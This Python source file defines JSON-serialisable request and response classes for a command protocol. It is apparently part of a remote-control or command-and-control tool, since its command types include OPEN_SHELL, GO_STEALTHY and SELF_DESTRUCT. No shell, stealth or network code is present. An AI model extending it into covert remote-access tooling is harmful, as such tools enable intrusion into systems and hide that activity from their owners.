import random
from typing import Optional
import string


class CommandTypes:
    PING = "PING"
    OPEN_SHELL = "OPEN_SHELL"
    GO_STEALTHY = "GO_STEALTHY"
    SELF_DESTRUCT = "SELF_DESTRUCT"


class CommandRequest:
    def __init__(self, command_type: str, params: Optional[dict] = None, uid: Optional[str] = None):
        self.command_type = command_type
        self.uid = uid if uid is not None else ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        self.params = params if params is not None else {}

    def to_json(self) -> dict:
        return {
            "command_type": self.command_type,
            "uid": self.uid,
            "params": self.params,
        }

    @staticmethod
    def from_json(data: dict) -> 'CommandRequest':
        return CommandRequest(
            command_type=data["command_type"],
            uid=data["uid"],
            params=data["params"],
        )


class CommandResponse:
    def __init__(self, request_uid: str, returns: Optional[dict] = None):
        self.request_uid = request_uid
        self.returns = returns if returns is not None else {}

    def to_json(self) -> dict:
        return {
            "request_uid": self.request_uid,
            "returns": self.returns,
        }

    @staticmethod
    def from_json(data: dict) -> 'CommandResponse':
        return CommandResponse(
            request_uid=data["request_uid"],
            returns=data["returns"],
        )


class CommandResponseError:
    def __init__(self, request_uid: str, error: str):
        self.request_uid = request_uid
        self.error = error

    def to_json(self) -> dict:
        return {
            "request_uid": self.request_uid,
            "error": self.error,
        }

    @staticmethod
    def from_json(data: dict) -> 'CommandResponseError':
        return CommandResponseError(
            request_uid=data["request_uid"],
            error=data["error"],
        )